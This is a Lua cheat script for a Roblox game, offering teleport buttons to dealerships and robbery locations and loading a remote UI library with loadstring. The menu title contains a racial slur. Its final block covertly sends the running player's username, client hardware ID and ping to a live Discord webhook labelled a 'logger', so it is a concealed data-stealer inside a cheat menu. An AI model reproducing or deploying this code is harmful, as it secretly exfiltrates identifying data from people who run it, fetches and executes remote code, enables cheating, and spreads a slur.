local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("niggaclark3000 🧻 | by okaynac", "DarkTheme")
local Tab = Window:NewTab("Teleport")
local Section = Tab:NewSection("Teleport")

Section:NewButton("Bowrey Cubemart", "Car Dealership", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1598.35205, 216.655014, -1534.57629, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

Section:NewButton("Mersea CD", "Car Dealership", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(6470.3999, 231.996841, 3019.69971, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

Section:NewButton("Bowrey CD", "Car Dealership", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1810.91406, 221.255737, -1328.6333, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

Section:NewButton("Woodbury CD", "Car Dealership", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(10027.8262, 240.156189, 578.294678, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

local Tab = Window:NewTab("Robbing")
local Section = Tab:NewSection("Robbing")
Section:NewButton("MNG Base", "", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1988.57935, 225.078323, 4476.59277, -0.0559921935, 1.04535092e-09, 0.998431206, -1.02757021e-07, 1, -6.80962486e-09, -0.998431206, -1.02977104e-07, -0.0559921935)
end)

Section:NewButton("PARK YOUR CAR HERE!", "next to woodbury CD", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9828.9082, 232.556091, 875.247986, -0.99941504, 3.2925942e-09, 0.0341997519, 2.49230081e-09, 1, -2.34431905e-08, -0.0341997519, -2.33442403e-08, -0.99941504)
end)

Section:NewButton("Lockpick Dealer", "", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-503.032654, 211.445923, -1312.66602, -0.00507884612, 4.44006831e-10, 0.999987125, 1.7484443e-07, 1, 4.44006831e-10, -0.999987125, 1.7484443e-07, -0.00507884612)
end)

local webh = "https://discord.com/api/webhooks/1339460549431398482/zASFb-BCy3YujV1gyio0P0rpFqws3qQ3cpnqILWuVnBIQcl7eRhzf-1BZ287IumlZRWd"


pcall(function()
   local data = {

  ['embeds'] = {
    {
       ['title'] = 'nigga clark ultra logger',
       ['description'] = 'get logged hahah!!!',
       ['fields'] = {
          {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
          {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
          {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},

        }
    }
  }
}
   
   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)
